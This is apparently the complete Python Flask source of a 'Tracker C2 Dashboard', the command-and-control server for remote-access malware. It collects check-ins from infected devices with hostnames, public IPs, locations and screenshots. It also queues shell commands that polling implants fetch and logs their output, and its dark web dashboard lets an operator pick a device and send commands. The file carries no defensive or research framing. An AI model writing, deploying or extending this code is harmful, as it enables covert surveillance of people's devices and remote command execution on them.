from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import sqlite3
import json
from datetime import datetime
import threading
import subprocess
import os
from collections import defaultdict
import base64
from io import BytesIO
from PIL import Image

app = Flask(__name__)
CORS(app)

# SQLite database setup
def init_db():
    conn = sqlite3.connect('tracker.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS tracks 
                 (device_id TEXT, timestamp TEXT, data TEXT, screenshot TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS shell_commands 
                 (device_id TEXT, command TEXT, output TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()

init_db()

# Store active devices and commands
active_devices = {}
pending_commands = defaultdict(list)

# HTML Dashboard
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Tracker C2 Dashboard</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a1a; color: #fff; }
        .device { background: #2d2d2d; padding: 15px; margin: 10px 0; border-radius: 8px; }
        .online { border-left: 4px solid #00ff00; }
        .offline { border-left: 4px solid #ff0000; }
        .screenshot { max-width: 400px; max-height: 300px; border-radius: 8px; }
        .cmd-input { width: 70%; padding: 10px; background: #3d3d3d; color: #fff; border: none; border-radius: 4px; }
        button { padding: 10px 20px; background: #0066cc; color: white; border: none; border-radius: 4px; cursor: pointer; }
        .logs { background: #000; padding: 15px; font-family: monospace; height: 300px; overflow-y: scroll; white-space: pre-wrap; }
    </style>
</head>
<body>
    <h1>🐱 Tracker C2 Dashboard</h1>
    <div id="devices"></div>
    <div style="margin-top: 20px;">
        <input type="text" id="cmdInput" class="cmd-input" placeholder="Enter command for selected device...">
        <button onclick="sendCommand()">Send Command</button>
    </div>
    <div id="logs" class="logs"></div>

    <script>
        let selectedDevice = null;
        
        function updateDashboard() {
            fetch('/dashboard').then(r => r.json()).then(data => {
                document.getElementById('devices').innerHTML = '';
                data.devices.forEach(device => {
                    const div = document.createElement('div');
                    div.className = `device ${device.online ? 'online' : 'offline'}`;
                    div.innerHTML = `
                        <h3>${device.hostname} (${device.device_id.slice(0,8)}...)</h3>
                        <p>IP: ${device.public_ip || 'Unknown'} | CPU: ${device.cpu_percent}% | RAM: ${device.memory?.percent}%</p>
                        ${device.location ? `<p>📍 ${device.location.city}, ${device.location.country}</p>` : ''}
                        ${device.screenshot ? `<img src="data:image/jpeg;base64,${device.screenshot}" class="screenshot">` : ''}
                        <br><button onclick="selectDevice('${device.device_id}')">Select</button>
                    `;
                    document.getElementById('devices').appendChild(div);
                });
            });
        }
        
        function selectDevice(deviceId) {
            selectedDevice = deviceId;
            document.getElementById('cmdInput').placeholder = `Command for ${deviceId.slice(0,8)}...`;
        }
        
        function sendCommand() {
            if (!selectedDevice) return alert('Select a device first!');
            const cmd = document.getElementById('cmdInput').value;
            fetch('/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({device_id: selectedDevice, command: cmd})
            });
            document.getElementById('cmdInput').value = '';
        }
        
        // Auto-update every 5 seconds
        setInterval(updateDashboard, 5000);
        updateDashboard();
    </script>
</body>
</html>
'''

@app.route('/')
def dashboard():
    return render_template_string(HTML_TEMPLATE)

@app.route('/dashboard')
def api_dashboard():
    conn = sqlite3.connect('tracker.db', check_same_thread=False)
    c = conn.cursor()
    
    # Get latest data per device
    c.execute('''SELECT DISTINCT device_id FROM tracks ORDER BY timestamp DESC''')
    device_ids = [row[0] for row in c.fetchall()]
    
    devices = []
    for device_id in device_ids[-10:]:  # Last 10 devices
        c.execute('SELECT * FROM tracks WHERE device_id=? ORDER BY timestamp DESC LIMIT 1', (device_id,))
        row = c.fetchone()
        if row:
            data = json.loads(row[2])
            data['online'] = (datetime.now().timestamp() - 
                            datetime.fromisoformat(data['timestamp'].replace('Z', '+00:00')).timestamp()) < 60
            devices.append(data)
    
    conn.close()
    return jsonify({'devices': devices})

@app.route('/track', methods=['POST'])
def track():
    data = request.json
    conn = sqlite3.connect('tracker.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('INSERT INTO tracks (device_id, timestamp, data, screenshot) VALUES (?, ?, ?, ?)',
              (data['device_id'], data['timestamp'], json.dumps(data), data.get('screenshot', '')))
    conn.commit()
    conn.close()
    
    # Mark device as active
    active_devices[data['device_id']] = datetime.now()
    return jsonify({'status': 'received'})

@app.route('/shell', methods=['POST'])
def shell():
    data = request.json
    device_id = data['device_id']
    
    # Return pending command
    if pending_commands[device_id]:
        cmd = pending_commands[device_id].pop(0)
        return jsonify({'command': cmd})
    return jsonify({'command': None})

@app.route('/shell_result', methods=['POST'])
def shell_result():
    data = request.json
    conn = sqlite3.connect('tracker.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('INSERT INTO shell_commands (device_id, command, output, timestamp) VALUES (?, ?, ?, ?)',
              (data['device_id'], data.get('command', ''), data['output'], datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({'status': 'received'})

@app.route('/command', methods=['POST'])
def command():
    data = request.json
    device_id = data['device_id']
    cmd = data['command']
    pending_commands[device_id].append(cmd)
    return jsonify({'status': 'queued'})

@app.route('/devices')
def devices():
    return jsonify(list(active_devices.keys()))

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)